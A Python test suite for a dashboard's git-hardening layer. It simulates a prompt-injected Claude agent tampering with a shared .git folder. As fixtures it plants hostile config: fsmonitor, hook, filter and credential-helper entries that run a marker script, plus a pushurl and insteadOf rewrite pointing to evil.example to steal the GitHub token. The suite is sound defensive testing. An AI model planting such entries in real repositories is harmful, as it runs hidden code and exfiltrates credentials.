"""The dashboard runs git in a checkout that Claude's shell can write to (another Linux user, same group). These tests play a prompt-injected
Claude that edits .git, and check that the dashboard's git calls neither run its commands nor send the GitHub token elsewhere. Real git."""
import os
import shutil
import stat
import subprocess
import tempfile
import unittest
from unittest import mock

from app import workspace as ws

HAVE_GIT = bool(shutil.which("git"))


def sh(cwd, *cmd, env=None):
    e = dict(os.environ, GIT_AUTHOR_NAME="t", GIT_AUTHOR_EMAIL="t@t", GIT_COMMITTER_NAME="t", GIT_COMMITTER_EMAIL="t@t", **(env or {}))
    return subprocess.run(cmd, cwd=cwd, env=e, capture_output=True, text=True)


@unittest.skipUnless(HAVE_GIT and hasattr(os, "getuid"), "needs git on a Unix system")
class HardenTests(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.root = os.path.join(self.tmp.name, "checkout")
        os.makedirs(self.root)
        sh(self.root, "git", "init", "-q", "-b", "main")
        with open(os.path.join(self.root, "a.txt"), "w") as f:
            f.write("a\n")
        sh(self.root, "git", "add", "-A")
        sh(self.root, "git", "commit", "-q", "-m", "one")
        sh(self.root, "git", "remote", "add", "origin", "https://github.com/acme/site.git")
        self.marker = os.path.join(self.tmp.name, "PWNED")
        self.script = os.path.join(self.tmp.name, "pwn.sh")
        with open(self.script, "w") as f:
            f.write(f"#!/bin/sh\ntouch {self.marker}\ncat >/dev/null 2>&1\nexit 0\n")
        os.chmod(self.script, 0o755)

    def config(self, *args):
        return sh(self.root, "git", "config", "--local", *args)

    def keys(self):
        return [l.split("=", 1)[0] for l in sh(self.root, "git", "config", "--local", "--list").stdout.splitlines()]

    def test_dangerous_settings_are_removed_before_git_runs_and_normal_ones_stay(self):
        self.config("core.fsmonitor", self.script)
        self.config("core.hooksPath", self.tmp.name)
        self.config("core.sshCommand", self.script)
        self.config("core.editor", self.script)
        self.config("remote.origin.pushurl", "https://evil.example/steal.git")
        self.config("filter.x.smudge", self.script)
        self.config("diff.external", self.script)
        self.config("credential.helper", self.script)
        self.config("include.path", "/tmp/elsewhere")
        self.config("url.https://evil.example/.insteadOf", "https://github.com/")
        self.config("branch.change/12-x.remote", "origin")
        ws.git(self.root, "status", "--short")
        left = self.keys()
        for bad in ("core.fsmonitor", "core.hookspath", "core.sshcommand", "core.editor", "remote.origin.pushurl", "filter.x.smudge",
                    "diff.external", "credential.helper", "include.path"):
            self.assertNotIn(bad, left)
        self.assertFalse([k for k in left if k.startswith("url.")])
        for good in ("core.repositoryformatversion", "core.bare", "remote.origin.url", "remote.origin.fetch", "branch.change/12-x.remote"):
            self.assertIn(good, left)
        self.assertEqual(self.config("remote.origin.url").stdout.strip(), "https://github.com/acme/site.git")

    def test_an_fsmonitor_command_does_not_run(self):
        self.config("core.fsmonitor", self.script)
        ws.git(self.root, "status", "--short")
        self.assertFalse(os.path.exists(self.marker))

    def test_a_hook_does_not_run(self):
        hook = os.path.join(self.root, ".git", "hooks", "pre-commit")
        with open(hook, "w") as f:
            f.write(f"#!/bin/sh\ntouch {self.marker}\n")
        os.chmod(hook, 0o755)
        with open(os.path.join(self.root, "b.txt"), "w") as f:
            f.write("b\n")
        ws.git(self.root, "add", "-A")
        ws.git(self.root, "commit", "--quiet", "-m", "two")
        self.assertFalse(os.path.exists(self.marker))
        self.assertFalse([h for h in os.listdir(os.path.join(self.root, ".git", "hooks")) if not h.endswith(".sample")])

    def test_a_smudge_filter_does_not_run_on_a_checkout(self):
        with open(os.path.join(self.root, ".gitattributes"), "w") as f:
            f.write("* filter=evil\n")
        self.config("filter.evil.smudge", self.script)
        self.config("filter.evil.clean", self.script)
        ws.git(self.root, "reset", "--hard", "--quiet")
        ws.git(self.root, "checkout", "--quiet", "-B", "other")
        self.assertFalse(os.path.exists(self.marker))

    def test_info_attributes_is_removed(self):
        attrs = os.path.join(self.root, ".git", "info", "attributes")
        os.makedirs(os.path.dirname(attrs), exist_ok=True)
        with open(attrs, "w") as f:
            f.write("* filter=evil\n")
        ws.git(self.root, "status")
        self.assertFalse(os.path.exists(attrs))

    def test_the_github_token_header_goes_only_to_the_remote_the_dashboard_set(self):
        self.config("remote.origin.pushurl", "https://evil.example/steal.git")
        seen = {}
        real_run = subprocess.run

        def spy(cmd, **kw):
            if cmd[:4] == ["sh", "-c", 'umask 027; exec "$@"', "sh"]:
                seen["cmd"] = cmd
            return real_run(cmd, **kw)
        with mock.patch.object(ws, "_auth_args", return_value=["-c", "http.extraHeader=Authorization: Basic SECRET"]), mock.patch.object(ws.subprocess, "run", side_effect=spy):
            ws.git(self.root, "ls-remote", "--get-url", "origin", auth=True, check=False)
        self.assertNotIn("remote.origin.pushurl", self.keys())
        self.assertIn("http.extraHeader=Authorization: Basic SECRET", seen["cmd"])

    def test_every_call_carries_the_safe_flags_and_the_umask(self):
        seen = {}
        real_run = subprocess.run

        def spy(cmd, **kw):
            if cmd[0] == "sh":
                seen["cmd"] = cmd
            return real_run(cmd, **kw)
        with mock.patch.object(ws.subprocess, "run", side_effect=spy):
            ws.git(self.root, "status")
        cmd = seen["cmd"]
        self.assertEqual(cmd[:5], ["sh", "-c", 'umask 027; exec "$@"', "sh", "git"])
        for flag in ("core.hooksPath=/dev/null", "core.fsmonitor=false"):
            self.assertIn(flag, cmd)

    def tree(self):
        out = set()
        for top, dirs, files in os.walk(os.path.join(self.root, ".git")):
            out.update([top] + [os.path.join(top, f) for f in files])
        return out

    def test_what_git_writes_is_not_group_writable_even_when_the_dashboard_runs_with_umask_007(self):
        # the dashboard's service runs with UMask=0007: plain git would make every new object, ref and index group-writable
        with open(os.path.join(self.root, "b.txt"), "w") as f:
            f.write("b\n")
        before = self.tree()
        old = os.umask(0o007)
        try:
            ws.git(self.root, "add", "-A")
            ws.git(self.root, "commit", "--quiet", "-m", "two")
        finally:
            os.umask(old)
        new = self.tree() - before
        self.assertTrue(any("/objects/" in n for n in new))
        self.assertEqual([n for n in new if os.lstat(n).st_mode & stat.S_IWGRP], [])
        plain_before = self.tree()
        os.umask(0o007)
        try:
            with open(os.path.join(self.root, "c.txt"), "w") as f:
                f.write("c\n")
            sh(self.root, "git", "add", "-A")
            sh(self.root, "git", "commit", "-q", "-m", "plain")
        finally:
            os.umask(old)
        self.assertTrue([n for n in self.tree() - plain_before if os.lstat(n).st_mode & stat.S_IWGRP])      # (proves the test would notice)

    def test_a_git_folder_that_is_not_ours_is_refused(self):
        with mock.patch.object(ws.os, "getuid", return_value=os.getuid() + 4242):
            with self.assertRaises(ws.WorkspaceError):
                ws.git(self.root, "status")

    def test_a_git_folder_replaced_by_a_symlink_or_a_file_is_refused(self):
        moved = os.path.join(self.tmp.name, "moved")
        os.rename(os.path.join(self.root, ".git"), moved)
        os.symlink(moved, os.path.join(self.root, ".git"))
        with self.assertRaises(ws.WorkspaceError):
            ws.git(self.root, "status")
        os.unlink(os.path.join(self.root, ".git"))
        with open(os.path.join(self.root, ".git"), "w") as f:
            f.write("gitdir: /somewhere/else\n")
        with self.assertRaises(ws.WorkspaceError):
            ws.git(self.root, "status")

    def test_an_unreadable_config_is_refused(self):
        with open(os.path.join(self.root, ".git", "config"), "w") as f:
            f.write("[core\n garbage = = =\n")
        with self.assertRaises(ws.WorkspaceError):
            ws.git(self.root, "status")

    def test_a_folder_without_git_just_runs_git_for_the_clone(self):
        empty = os.path.join(self.tmp.name, "empty")
        os.makedirs(empty)
        self.assertIn("git version", ws.git(empty, "--version"))      # no .git there: nothing to harden, nothing raised

    def test_lock_git_takes_away_group_and_other_write_under_dot_git_only(self):
        git = os.path.join(self.root, ".git")
        os.chmod(os.path.join(git, "config"), 0o666)
        os.chmod(os.path.join(git, "hooks"), 0o777)
        os.chmod(os.path.join(self.root, "a.txt"), 0o666)
        ws.lock_git(self.root)
        self.assertEqual(stat.S_IMODE(os.stat(os.path.join(git, "config")).st_mode) & (stat.S_IWGRP | stat.S_IWOTH), 0)
        self.assertEqual(stat.S_IMODE(os.stat(os.path.join(git, "hooks")).st_mode) & (stat.S_IWGRP | stat.S_IWOTH), 0)
        self.assertTrue(os.stat(os.path.join(self.root, "a.txt")).st_mode & stat.S_IWGRP)        # the project's own files stay shared with the runner
        self.assertTrue(os.stat(os.path.join(git, "config")).st_mode & stat.S_IRUSR)

    def test_prepare_starts_again_when_the_checkout_was_tampered_with(self):
        project = mock.Mock(github_repo="acme/site", slug="site", default_branch="main")
        base = os.path.join(self.tmp.name, "ws")
        os.makedirs(base)
        shutil.move(self.root, os.path.join(base, "site"))
        with open(os.path.join(base, "site", ".git", "config"), "w") as f:
            f.write("[core\n garbage = = =\n")
        calls = []
        with mock.patch.object(ws, "root_for", return_value=__import__("pathlib").Path(base) / "site"), mock.patch.object(ws, "remote_url", return_value="https://x/y.git"), \
                mock.patch.object(ws, "git", side_effect=lambda *a, **kw: calls.append(a) or ""), mock.patch.object(ws, "share_with_runner"):
            try:
                ws.prepare(project, "change/1-x", "main")
            except ws.WorkspaceError:
                pass
        self.assertTrue(any(c[1] == "clone" for c in calls))            # it cloned afresh instead of trusting the damaged checkout


if __name__ == "__main__":
    unittest.main()
